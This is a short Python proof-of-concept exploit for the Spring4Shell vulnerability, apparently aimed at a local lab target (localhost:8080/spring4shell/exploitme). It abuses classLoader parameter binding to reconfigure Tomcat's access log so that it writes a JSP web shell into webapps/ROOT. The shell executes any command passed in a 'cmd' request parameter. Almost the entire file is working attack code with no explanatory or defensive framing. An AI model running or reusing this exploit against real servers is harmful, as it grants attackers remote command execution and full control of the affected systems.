import requests
import time

requests.packages.urllib3.disable_warnings()

post_headers = {"Content-Type": "application/x-www-form-urlencoded"}
get_headers = {"prefix": "<%", "suffix": "%>//", "c": "Runtime"}

def run_exploit():
    log_pattern = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di"
    exp_data = "&".join([log_pattern, "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp", "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT", "class.module.classLoader.resources.context.parent.pipeline.first.prefix=webshell", "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="])
    #webshell.jsp 설정

    url = "http://localhost:8080/spring4shell/exploitme"
    requests.post(url, headers=post_headers, data=exp_data, verify=False)
    time.sleep(3)
    requests.get(url, headers=get_headers, verify=False)
    time.sleep(1)

if __name__ == '__main__':
    run_exploit()
    print("[+] Exploit completed")